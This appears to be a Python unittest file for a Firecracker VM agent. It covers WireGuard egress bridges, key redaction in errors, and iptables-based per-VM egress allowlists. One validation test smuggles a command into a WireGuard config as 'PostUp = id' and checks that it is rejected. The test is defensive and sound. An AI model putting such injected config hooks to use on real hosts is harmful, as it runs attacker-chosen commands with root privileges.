        self.assertEqual(self.verb("attach"), [["bash", str(fc_agent.WG_SCRIPT), "attach", fp, "0", "fcv3", "10.200.3.1", "1080", "1080"]])
        self.assertEqual(fc_agent.wg_refs(fp), {"vm-a"})

    def test_same_config_shares_the_bridge_and_an_http_vm_gets_the_http_port(self):
        fc_agent.wg_provision(self.meta("vm-a", 3), self.body())
        fp = self.ups()[0][0][-2]
        ep = fc_agent.wg_provision(self.meta("vm-b", 4), self.body(protocol="http"))
        self.assertEqual(ep, {"url": "http://10.200.4.1:1080", "protocol": "http"})
        self.assertEqual({c[0][-1] for c in self.ups()}, {"0"}, "a second slot was allocated for the same config")
        self.assertIn(["bash", str(fc_agent.WG_SCRIPT), "attach", fp, "0", "fcv4", "10.200.4.1", "1080", "1081"], self.sudos)
        self.assertEqual(fc_agent.wg_refs(fp), {"vm-a", "vm-b"})

    def test_a_different_config_gets_its_own_slot(self):
        fc_agent.wg_provision(self.meta("vm-a", 3), self.body())
        fc_agent.wg_provision(self.meta("vm-b", 4), self.body(WG_CONF.replace("10.64.0.2/32", "10.64.0.9/32")))
        self.assertEqual([c[0][-1] for c in self.ups()], ["0", "1"])

    def test_last_vm_out_tears_the_bridge_down_and_frees_the_slot(self):
        fc_agent.wg_provision(self.meta("vm-a", 3), self.body())
        fc_agent.wg_provision(self.meta("vm-b", 4), self.body(protocol="http"))
        fp = self.ups()[0][0][-2]
        self.sudos.clear()
        fc_agent.wg_destroy(self.meta("vm-a", 3))
        self.assertEqual(self.verb("detach"), [["bash", str(fc_agent.WG_SCRIPT), "detach", fp, "0", "fcv3", "10.200.3.1", "1080", "1080"]])
        self.assertEqual(self.verb("down"), [], "torn down with a vm still attached")
        self.sudos.clear()
        fc_agent.wg_destroy(self.meta("vm-b", 4))
        self.assertEqual(self.verb("detach")[0][-1], "1081", "detach must remove the dnat attach added")
        self.assertEqual(self.verb("down"), [["bash", str(fc_agent.WG_SCRIPT), "down", fp, "0"]])
        self.assertFalse((fc_agent.WG_DIR / fp).exists())
        # a second destroy is a no-op.
        self.sudos.clear()
        fc_agent.wg_destroy(self.meta("vm-b", 4))
        self.assertEqual(self.sudos, [])
        # and slot 0 is free again.
        fc_agent.wg_provision(self.meta("vm-c", 5), self.body(WG_CONF.replace("10.64.0.2/32", "10.64.0.9/32")))
        self.assertEqual(self.ups()[-1][0][-1], "0")

    def test_a_bridge_that_does_not_come_up_is_a_502_without_the_key_and_holds_nothing(self):
        def failing_run(cmd, check=True, input_bytes=None):
            return subprocess.CompletedProcess(cmd, 1, stdout=b"", stderr=f"[wireguard] no handshake key={WG_PRIVATE}\n".encode())

        with mock.patch.object(fc_agent, "run", side_effect=failing_run):
            with self.assertRaises(fc_agent.HTTPError) as caught:
                fc_agent.wg_provision(self.meta("vm-a"), self.body())
        self.assertEqual(caught.exception.code, 502)
        self.assertNotIn(WG_PRIVATE, caught.exception.msg)
        self.assertIn("[REDACTED]", caught.exception.msg)
        self.assertEqual(len(self.verb("down")), 1, "a failed first bridge must be torn down")
        self.assertEqual(list(fc_agent.WG_DIR.glob("*")) if fc_agent.WG_DIR.exists() else [], [])

    def test_rejects_bad_requests_before_touching_the_host(self):
        for body in (
            self.body(protocol="udp"),
            self.body(config={}),
            self.body(config={"WG_CONF": wg_blob(), "EVIL": "x"}),
            self.body(config={"WG_CONF": "not base64!!"}),
            self.body(WG_CONF.replace("DNS = 10.64.0.1", "PostUp = id")),
        ):
            with self.assertRaises(fc_agent.HTTPError) as caught:
                fc_agent.wg_provision(self.meta("vm-a"), body)
            self.assertEqual(caught.exception.code, 400)
        self.assertEqual(self.runs, [])
        self.assertEqual(self.sudos, [])

    def test_registered_under_its_name(self):
        self.assertIn("wireguard", fc_agent.EGRESS_PROVIDERS)


class ExecEnvTest(unittest.TestCase):
    """exec'd commands and attach-with-command run as a non-login bash -c
    over ssh, which reads no profile, so the agent sources the egress hook
    ahead of them. a bare attach is a login shell and reads it itself."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.vms = Path(self.tmp.name) / "vms"
        self.vms.mkdir()
        for mod in (fc_agent, fc_agent.agentlib):
            patcher = mock.patch.object(mod, "VMS_DIR", self.vms)
            patcher.start()
            self.addCleanup(patcher.stop)
        (self.vms / "vm-a").mkdir()
        fc_agent.save_meta({"vm_id": "vm-a", "guest_ip": "10.200.3.2"})

    def test_exec_sources_the_egress_hook_first(self):
        with mock.patch.object(fc_agent.agentlib, "ssh_exec", return_value=(0, b"", b"")) as ssh:
            fc_agent.do_exec("vm-a", ["env"])
        remote = ssh.call_args.args[1]
        self.assertTrue(remote.startswith(fc_agent.agentlib.EGRESS_ENV_PREFIX), remote)
        self.assertTrue(remote.endswith("env"), remote)
        # the guard keeps a guest with no hook file unchanged.
        self.assertIn("[ -r /etc/profile.d/fuse-egress.sh ] &&", remote)

    def test_exec_still_quotes_the_command(self):
        with mock.patch.object(fc_agent.agentlib, "ssh_exec", return_value=(0, b"", b"")) as ssh:
            fc_agent.do_exec("vm-a", ["sh", "-c", "echo $HTTP_PROXY"])
        remote = ssh.call_args.args[1]
        self.assertTrue(remote.endswith("sh -c 'echo $HTTP_PROXY'"), remote)

    def test_attach_with_command_sources_the_hook(self):
        argv = fc_agent.agentlib.attach_argv("10.200.3.2", ["bash"])
        self.assertEqual(argv[-2:], [fc_agent.agentlib.EGRESS_ENV_PREFIX, "bash"])

    def test_bare_attach_is_a_plain_login_shell(self):
        argv = fc_agent.agentlib.attach_argv("10.200.3.2", [])
        self.assertEqual(argv[-2:], ["-tt", "root@10.200.3.2"])
        self.assertNotIn(fc_agent.agentlib.EGRESS_ENV_PREFIX, argv)


class VMPublicTest(unittest.TestCase):
    def test_reports_the_tap_ends_and_the_mode(self):
        pub = fc_agent.vm_public({"vm_id": "vm-a", "url": "u", "host_ip": "10.200.3.1", "guest_ip": "10.200.3.2", "egress_mode": "proxy"})
        self.assertEqual(pub, {"vm_id": "vm-a", "url": "u", "host_ip": "10.200.3.1", "guest_ip": "10.200.3.2", "egress_mode": "proxy", "epoch": 0})

    def test_pre_egress_meta_reads_as_direct(self):
        pub = fc_agent.vm_public({"vm_id": "vm-a"})
        self.assertEqual(pub["egress_mode"], "direct")
        self.assertEqual(pub["host_ip"], "")



# the direct egress allowlist (#449): a per-vm chain the outbound leg jumps
# to, swapped under two names so a replace is never half applied.
CHAIN_A, CHAIN_B = "FUSE-EG-fcv3-A", "FUSE-EG-fcv3-B"
JUMP_A = ["FORWARD", "-i", "fcv3", "-o", "eth0", "-j", CHAIN_A]
JUMP_B = ["FORWARD", "-i", "fcv3", "-o", "eth0", "-j", CHAIN_B]
ACCEPT = ["FORWARD", "-i", "fcv3", "-o", "eth0", "-j", "ACCEPT"]


def chain_body(chain, cidrs):
    rules = [IPT + ["-A", chain, "-m", "conntrack", "--ctstate", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
             IPT + ["-A", chain, "-d", "1.1.1.1/32", "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
             IPT + ["-A", chain, "-d", "1.1.1.1/32", "-p", "tcp", "--dport", "53", "-j", "ACCEPT"]]
    rules += [IPT + ["-A", chain, "-d", c, "-j", "ACCEPT"] for c in cidrs]
    return rules + [IPT + ["-A", chain, "-j", "DROP"]]


class EgressAllowParseTest(unittest.TestCase):
    def test_normalizes_dedupes_and_keeps_order(self):
        got = fc_agent.agentlib.parse_egress_allow(
            ["10.1.2.3/8", "1.2.3.4", " 192.168.0.0/16 ", "10.0.0.0/8", "1.2.3.4/32"])
        self.assertEqual(got, ["10.0.0.0/8", "1.2.3.4/32", "192.168.0.0/16"])

    def test_bad_entries_are_a_400(self):
        for bad in (["nope"], ["::1"], ["10.0.0.0/33"], [5], [None], "10.0.0.0/8", None):
            with self.subTest(bad=bad), self.assertRaises(fc_agent.HTTPError) as caught:
                fc_agent.agentlib.parse_egress_allow(bad)
            self.assertEqual(caught.exception.code, 400)

    def test_the_list_is_bounded(self):
        many = [f"10.0.{i // 256}.{i % 256}" for i in range(fc_agent.agentlib.EGRESS_ALLOW_MAX + 1)]
        with self.assertRaises(fc_agent.HTTPError) as caught:
            fc_agent.agentlib.parse_egress_allow(many)
        self.assertEqual(caught.exception.code, 400)

    def test_the_fixup_and_the_chain_share_the_resolver(self):
        self.assertIn(fc_agent.EGRESS_RESOLVER, fc_agent.guest_network_fixup("172.16.0.1", "direct"))


class EgressAllowRulesTest(unittest.TestCase):
    def set(self, cidrs, present=()):
        calls, fake = capture_sudo(present=present)
        with mock.patch.object(fc_agent, "sudo", side_effect=fake):
            fc_agent.agentlib.set_egress_allow(fc_agent.sudo, "fcv3", "eth0", cidrs)
        return calls

    def test_from_unrestricted_builds_a_then_jumps_then_drops_the_accept(self):
        calls = self.set(["10.0.0.0/8"], present=[ACCEPT])
        new = calls.index(IPT + ["-N", CHAIN_A])
        body = chain_body(CHAIN_A, ["10.0.0.0/8"])
        self.assertEqual(calls[new + 1:new + 1 + len(body)], body)
        jump = calls.index(IPT + ["-I"] + JUMP_A)
        self.assertGreater(jump, new + len(body))
        # the accept goes only once the jump is in: no window with neither.
        self.assertLess(jump, calls.index(IPT + ["-D"] + ACCEPT))
        self.assertNotIn(IPT + ["-N", CHAIN_B], calls)

    def test_replace_builds_the_other_name_before_moving_the_jump(self):
        # A is live: the -C for its jump answers present.
        calls = self.set(["1.2.3.4/32"], present=[["-C"] + JUMP_A, ["-D"] + JUMP_A])
        self.assertNotIn(IPT + ["-N", CHAIN_A], calls)
        built = calls.index(IPT + ["-A", CHAIN_B, "-j", "DROP"])
        jump = calls.index(IPT + ["-I"] + JUMP_B)
        unjump = calls.index(IPT + ["-D"] + JUMP_A)
        self.assertLess(built, jump)
        self.assertLess(jump, unjump)
        self.assertLess(unjump, calls.index(IPT + ["-F", CHAIN_A]))
        self.assertLess(calls.index(IPT + ["-F", CHAIN_A]), calls.index(IPT + ["-X", CHAIN_A]))
        self.assertNotIn(IPT + ["-I"] + ACCEPT, calls)

    def test_replace_clears_what_a_crash_left_under_the_new_name(self):
        calls = self.set(["1.2.3.4/32"], present=[["-C"] + JUMP_A])
        self.assertLess(calls.index(IPT + ["-X", CHAIN_B]), calls.index(IPT + ["-N", CHAIN_B]))

    def test_empty_list_restores_the_plain_accept_before_the_chain_goes(self):
        calls = self.set([], present=[["-D"] + JUMP_A])
        accept = calls.index(IPT + ["-I"] + ACCEPT)
        self.assertLess(accept, calls.index(IPT + ["-D"] + JUMP_A))
        for chain in (CHAIN_A, CHAIN_B):
            self.assertIn(IPT + ["-X", chain], calls)
        self.assertFalse(any(c[3] == "-N" for c in calls))

    def test_empty_list_on_an_unrestricted_vm_keeps_its_accept(self):
        calls = self.set([], present=[["-C"] + ACCEPT])
        self.assertNotIn(IPT + ["-I"] + ACCEPT, calls)
        self.assertNotIn(IPT + ["-D"] + ACCEPT, calls)

    def test_same_list_twice_gives_the_same_chain(self):
        first = self.set(["10.0.0.0/8"])
        second = self.set(["10.0.0.0/8"], present=[["-C"] + JUMP_A, ["-D"] + JUMP_A])
        self.assertEqual([c[5:] for c in first if c[3] == "-A"], [c[5:] for c in second if c[3] == "-A"])

    def test_chain_names_fit_iptables(self):
        for chain in fc_agent.agentlib.egress_chains(fc_agent.tap_name(fc_agent.SLOT_MAX)):
            self.assertLessEqual(len(chain), 28)


class EgressAllowVMTest(unittest.TestCase):
    """the PUT handler, teardown and rebuild, over a vm dir in a tmp dir."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.vms = Path(self.tmp.name) / "vms"
        self.vms.mkdir()
        for target, value in (("VMS_DIR", self.vms), ("SSH_CONTROL_DIR", Path(self.tmp.name))):
            for mod in (fc_agent, fc_agent.agentlib):
                p = mock.patch.object(mod, target, value)
                p.start()
                self.addCleanup(p.stop)
        for mod in (fc_agent, fc_agent.agentlib):
            p = mock.patch.object(mod, "host_iface", return_value="eth0")
            p.start()
            self.addCleanup(p.stop)

    def write_meta(self, **extra):
        (self.vms / "vm-a").mkdir()
        meta = {"vm_id": "vm-a", "index": 3, "tap": "fcv3", "netns": "fcns3", "host_ip": "10.208.0.3",
                "guest_ip": "10.209.0.3", "guest_net": dict(fc_agent.GUEST_NET), "egress_mode": "direct"}
        meta.update(extra)
        fc_agent.save_meta(meta)

    def put(self, cidrs, present=(), conntrack=None):
        calls, fake = capture_sudo(present=present)

        def sudo(cmd, check=True):
            if cmd[0] == "conntrack" and conntrack is not None:
                calls.append(list(cmd))
                return conntrack(cmd)
            return fake(cmd, check)

        with mock.patch.object(fc_agent, "sudo", side_effect=sudo):
            return fc_agent.put_egress_allow("vm-a", {"cidrs": cidrs}), calls

    def test_unknown_vm_is_a_404(self):
        with self.assertRaises(fc_agent.HTTPError) as caught:
            fc_agent.put_egress_allow("vm-missing", {"cidrs": []})
        self.assertEqual(caught.exception.code, 404)

    def test_proxy_vm_is_a_409_and_untouched(self):
        self.write_meta(egress_mode="proxy")
        with mock.patch.object(fc_agent, "sudo", side_effect=AssertionError("sudo must not run")):
            with self.assertRaises(fc_agent.HTTPError) as caught:
                fc_agent.put_egress_allow("vm-a", {"cidrs": ["10.0.0.0/8"]})
        self.assertEqual(caught.exception.code, 409)
        self.assertNotIn("egress_allow", fc_agent.load_meta("vm-a"))

    def test_bad_cidr_is_a_400_and_untouched(self):
        self.write_meta(egress_allow=["10.0.0.0/8"])
        with mock.patch.object(fc_agent, "sudo", side_effect=AssertionError("sudo must not run")):
            with self.assertRaises(fc_agent.HTTPError) as caught:
                fc_agent.put_egress_allow("vm-a", {"cidrs": ["10.0.0.0/8", "bogus"]})
        self.assertEqual(caught.exception.code, 400)
        self.assertEqual(fc_agent.load_meta("vm-a")["egress_allow"], ["10.0.0.0/8"])

    def test_records_the_normalized_list_and_an_empty_one_lifts_it(self):
        self.write_meta()
        resp, _ = self.put(["1.2.3.4", "10.9.9.9/8", "1.2.3.4/32"])
        self.assertEqual(resp, {"cidrs": ["1.2.3.4/32", "10.0.0.0/8"]})
        self.assertEqual(fc_agent.load_meta("vm-a")["egress_allow"], ["1.2.3.4/32", "10.0.0.0/8"])
        again, _ = self.put(["1.2.3.4", "10.9.9.9/8"], present=[["-C"] + JUMP_A])
        self.assertEqual(again, resp)
        resp, calls = self.put([])
        self.assertEqual(resp, {"cidrs": []})
        self.assertNotIn("egress_allow", fc_agent.load_meta("vm-a"))
        self.assertFalse(any(c[0] == "conntrack" for c in calls), "lifting the list flushes nothing")

    def test_from_unrestricted_flushes_what_the_guest_opened(self):
        # -s is the original source. the orchestrator's connection to fused
        # has the orchestrator as its original source, so it is not matched.
        self.write_meta()
        _, calls = self.put(["10.0.0.0/8"])
        self.assertEqual([c for c in calls if c[0] == "conntrack"], [["conntrack", "-D", "-s", "10.209.0.3"]])
        self.assertGreater(calls.index(["conntrack", "-D", "-s", "10.209.0.3"]), calls.index(IPT + ["-I"] + JUMP_A))

    def test_a_replace_flushes_only_the_removed_cidrs(self):
        self.write_meta(egress_allow=["10.0.0.0/8", "1.2.3.4/32"])
        _, calls = self.put(["1.2.3.4/32", "192.168.0.0/16"], present=[["-C"] + JUMP_A])
        self.assertEqual([c for c in calls if c[0] == "conntrack"], [
            ["conntrack", "-D", "-s", "10.209.0.3", "-d", "10.0.0.0", "--mask-dst", "255.0.0.0"],
        ])

    def test_a_legacy_vm_flushes_by_its_own_address(self):
        self.write_meta(netns=None, guest_net=None, guest_ip="10.200.3.2", host_ip="10.200.3.1")
        _, calls = self.put(["10.0.0.0/8"])
        self.assertIn(["conntrack", "-D", "-s", "10.200.3.2"], calls)

    def test_missing_conntrack_is_best_effort(self):
        self.write_meta()
        missing = lambda cmd: subprocess.CompletedProcess(cmd, 1, b"", b"sudo: conntrack: command not found")
        with mock.patch("builtins.print") as printed:
            resp, calls = self.put(["10.0.0.0/8"], conntrack=missing)
        self.assertEqual(resp, {"cidrs": ["10.0.0.0/8"]})
        self.assertIn(IPT + ["-I"] + JUMP_A, calls)
        self.assertEqual(fc_agent.load_meta("vm-a")["egress_allow"], ["10.0.0.0/8"])
        self.assertTrue(any("conntrack" in str(c) for c in printed.call_args_list))

        def gone(cmd):
            raise FileNotFoundError("sudo")

        shutil.rmtree(self.vms / "vm-a")
        self.write_meta()
        resp, _ = self.put(["10.0.0.0/8"], conntrack=gone)
        self.assertEqual(resp, {"cidrs": ["10.0.0.0/8"]})

    def test_an_empty_match_is_not_reported(self):
        self.write_meta()
        empty = lambda cmd: subprocess.CompletedProcess(
            cmd, 1, b"", b"conntrack v1.4.7 (conntrack-tools): 0 flow entries have been deleted.\n")
        with mock.patch("builtins.print") as printed:
            self.put(["10.0.0.0/8"], conntrack=empty)
        printed.assert_not_called()

    def test_teardown_purges_both_chains_before_the_namespace(self):
        calls, fake = capture_sudo()
        with mock.patch.object(fc_agent, "sudo", side_effect=fake), \
             mock.patch.object(fc_agent.agentlib, "sudo", side_effect=fake):
            fc_agent.teardown_net(3, "eth0")
        ns = calls.index(["ip", "netns", "del", "fcns3"])
        for chain, jump in ((CHAIN_A, JUMP_A), (CHAIN_B, JUMP_B)):
            self.assertLess(calls.index(IPT + ["-D"] + jump), ns)
            self.assertLess(calls.index(IPT + ["-X", chain]), ns)

    def test_rebuild_reapplies_the_recorded_list(self):
        for extra in ({}, {"netns": None, "guest_net": None, "guest_ip": "10.200.3.2"}):
            with self.subTest(extra=extra):
                shutil.rmtree(self.vms / "vm-a", ignore_errors=True)
                self.write_meta(egress_allow=["10.0.0.0/8"], **extra)
                calls, fake = capture_sudo()
                with mock.patch.object(fc_agent, "sudo", side_effect=fake), \
                     mock.patch.object(fc_agent, "add_agent_forward"), \
                     mock.patch.object(fc_agent, "del_agent_forward"):
                    fc_agent.rebuild_net(fc_agent.load_meta("vm-a"))
                # the plain accept host_rules makes, then the allowlist over it.
                accept = calls.index(IPT + ["-I"] + ACCEPT)
                self.assertLess(accept, calls.index(IPT + ["-N", CHAIN_A]))
                self.assertLess(calls.index(IPT + ["-I"] + JUMP_A), calls.index(IPT + ["-D"] + ACCEPT, accept))
                self.assertFalse(any(c[0] == "conntrack" for c in calls))

    def test_rebuild_without_a_list_is_unchanged(self):
        self.write_meta()
        calls, fake = capture_sudo()
        with mock.patch.object(fc_agent, "sudo", side_effect=fake), \
             mock.patch.object(fc_agent, "add_agent_forward"), \
             mock.patch.object(fc_agent, "del_agent_forward"):
            fc_agent.rebuild_net(fc_agent.load_meta("vm-a"))
        self.assertFalse(any(c[3:4] == ["-N"] for c in calls if c[:3] == IPT))


class EgressAllowCreateTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        root = Path(self.tmp.name)
        self.vms = root / "vms"
        self.vms.mkdir()
        rootfs = root / "rootfs.ext4"
        rootfs.write_bytes(b"rootfs")
        self.calls, fake = capture_sudo()
        patches = [
            mock.patch.object(fc_agent, "VMS_DIR", self.vms),
            mock.patch.object(fc_agent.agentlib, "VMS_DIR", self.vms),
            mock.patch.object(fc_agent.agentlib, "STATE_DIR", root),
            mock.patch.object(fc_agent, "BASE_ROOTFS", rootfs),
            mock.patch.object(fc_agent, "sudo", side_effect=fake),
            mock.patch.object(fc_agent, "host_iface", return_value="eth0"),
            mock.patch.object(fc_agent, "add_agent_forward"),
            mock.patch.object(fc_agent, "start_firecracker",
                              side_effect=lambda meta: self.calls.append(["<boot>"])),
            mock.patch.object(fc_agent, "wait_for_ssh", return_value=False),
        ]
        for p in patches:
            p.start()
            self.addCleanup(p.stop)

    def test_bad_allow_is_a_400_before_anything_is_allocated(self):
        for egress in ({"allow": ["nope"]}, {"mode": "proxy", "allow": ["10.0.0.0/8"]}):
            with self.subTest(egress=egress), \
                 mock.patch.object(fc_agent, "pick_index", side_effect=AssertionError("no index must be picked")):
                with self.assertRaises(fc_agent.HTTPError) as caught:
                    fc_agent.create_vm({"name": "x", "egress": egress})
            self.assertEqual(caught.exception.code, 400)
        self.assertEqual(self.calls, [])

    def test_allow_builds_the_chain_and_jump_before_the_guest_boots(self):
        meta = fc_agent.create_vm({"name": "x", "egress": {"mode": "direct", "allow": ["1.2.3.4"]}})
        self.assertEqual(meta["egress_allow"], ["1.2.3.4/32"])
        tap = meta["tap"]
        jump = IPT + ["-I", "FORWARD", "-i", tap, "-o", "eth0", "-j", f"FUSE-EG-{tap}-A"]
        self.assertIn(IPT + ["-A", f"FUSE-EG-{tap}-A", "-d", "1.2.3.4/32", "-j", "ACCEPT"], self.calls)
        self.assertLess(self.calls.index(jump), self.calls.index(["<boot>"]))
        self.assertLess(self.calls.index(jump),
                        self.calls.index(IPT + ["-D", "FORWARD", "-i", tap, "-o", "eth0", "-j", "ACCEPT"],
                                         self.calls.index(IPT + ["-I", "FORWARD", "-i", tap, "-o", "eth0", "-j", "ACCEPT"])))

    def test_no_allow_builds_no_chain(self):
        meta = fc_agent.create_vm({"name": "x", "egress": {"mode": "direct", "allow": []}})
        self.assertNotIn("egress_allow", meta)
        self.assertFalse(any(c[3:4] == ["-N"] for c in self.calls if c[:3] == IPT))


class EgressAllowRouteTest(unittest.TestCase):
    """the PUT route: auth, the vm lock, the json in and out."""

    def setUp(self):
        import http.client
        import threading
        from http.server import ThreadingHTTPServer
        self.http = http.client
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        root = Path(self.tmp.name)
        self.vms = root / "vms"
        self.vms.mkdir()
        _, fake = capture_sudo()
        patches = [
            mock.patch.object(fc_agent, "VMS_DIR", self.vms),
            mock.patch.object(fc_agent.agentlib, "VMS_DIR", self.vms),
            mock.patch.object(fc_agent.agentlib, "STATE_DIR", root),
            mock.patch.object(fc_agent, "sudo", side_effect=fake),
            mock.patch.object(fc_agent, "host_iface", return_value="eth0"),
        ]
        for p in patches:
            p.start()
            self.addCleanup(p.stop)
        self.srv = ThreadingHTTPServer(("127.0.0.1", 0), fc_agent.Handler)
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()
        self.addCleanup(self.srv.server_close)
        self.addCleanup(self.srv.shutdown)

    def put(self, vm_id, body):
        c = self.http.HTTPConnection("127.0.0.1", self.srv.server_port, timeout=10)
        try:
            c.request("PUT", f"/v1/vm/{vm_id}/egress/allow", body=json.dumps(body).encode(),
                      headers={"Authorization": "Bearer test-token", "Content-Type": "application/json"})
            r = c.getresponse()
            return r.status, r.read()
        finally:
            c.close()

    def test_status_codes(self):
        (self.vms / "vm-a").mkdir()
        fc_agent.save_meta({"vm_id": "vm-a", "index": 3, "tap": "fcv3", "guest_ip": "10.209.0.3", "egress_mode": "direct"})
        (self.vms / "vm-p").mkdir()
        fc_agent.save_meta({"vm_id": "vm-p", "index": 4, "tap": "fcv4", "guest_ip": "10.209.0.4", "egress_mode": "proxy"})
        code, body = self.put("vm-a", {"cidrs": ["1.2.3.4"]})
        self.assertEqual((code, json.loads(body)), (200, {"cidrs": ["1.2.3.4/32"]}))
        self.assertEqual(self.put("vm-missing", {"cidrs": []})[0], 404)
        self.assertEqual(self.put("vm-p", {"cidrs": ["1.2.3.4"]})[0], 409)
        self.assertEqual(self.put("vm-a", {"cidrs": ["1.2.3.4/40"]})[0], 400)
        self.assertEqual(self.put("vm-a", {})[0], 400)


if __name__ == "__main__":
    unittest.main()
